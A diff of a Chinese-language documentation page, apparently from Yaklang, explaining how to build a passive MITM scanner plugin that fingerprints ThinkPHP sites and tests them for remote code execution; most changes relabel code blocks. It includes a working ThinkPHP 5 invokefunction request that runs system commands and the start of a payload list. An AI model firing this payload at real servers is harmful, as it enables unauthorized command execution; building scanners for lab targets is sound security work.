@@ -1,8 +1,12 @@
-# thinkphp5 rce漏洞被动扫描插件[mitm]
+---
+sidebar_position: 3
+---
+
+# ThinkPHP RCE 被动扫描插件 [MITM]
 
 ## 环境搭建
 
-环境使用http://vulfocus.io/，启动一个thinkphp实例
+环境使用 `http://vulfocus.io/`，启动一个thinkphp实例
 
 ## 指纹检测
 
@@ -20,7 +24,7 @@
 
 所以可以通过正则，对header进行匹配：``
 
-```JavaScript
+```go
 thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]
 // headers是返回包的header
 checkHeader = fn(headers){
@@ -39,7 +43,7 @@ checkHeader = fn(headers){
 
 在yak里可以直接获取到站点favicon.ico的hash
 
-```Bash
+```go
 hash, err = http.RequestFaviconHash(<favicon.ico地址>)
 ```
 
@@ -59,7 +63,7 @@ chechIcon2 = fn(rootUrl){
 
 所以当http://xxx.xx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a返回一个图片时，就可以判定这是thinkphp站点
 
-```Swift
+```go
 rsp,_ = http.Get("http://xxx.xx/?c=4e5e5d7364f443e28fbf0d3ae744a59a")
 rspB,_ = http.dump(rsp)
 header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)
@@ -72,7 +76,7 @@ println(string(body))
 
 从这里提取出两个指纹"IHDR"和"PNG"，如下
 
-```D
+```go
 // rootUrl是网站根路径
 chechIcon1 = fn(rootUrl){
     u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"
@@ -95,7 +99,7 @@ chechIcon1 = fn(rootUrl){
 
 可以通过[fuzz标签](https://www.yaklang.io/docs/buildinlibs/lib_fuzz#fuzz-标签定义以及使用)去写payload，如
 
-```Apache
+```go
 GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
 Host: {{params(target)}}
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
@@ -116,7 +120,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 例如：
 
-```Go
+```go
 risk.NewRisk("https://www.baidu.com", risk.title("html源码泄露"), risk.type("敏感信息泄露"),risk.level("高危"))
 ```
 
@@ -130,7 +134,7 @@ mitm模块主要提供了5个hook方法，创建新插件时的模板有详细�
 
 代码如下
 
-```Python
+```go
 rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
 // 手动对favicon.ico的hash计算方法就是，先base64，再MMH3Hash32计算
 if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{
@@ -144,7 +148,7 @@ if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp))
 
 ## 最终代码
 
-```Go
+```go
 payloads = [
     {
         "name":"thinkphp5.0.23 5.0.7 ~ 5.0.23命令执行",
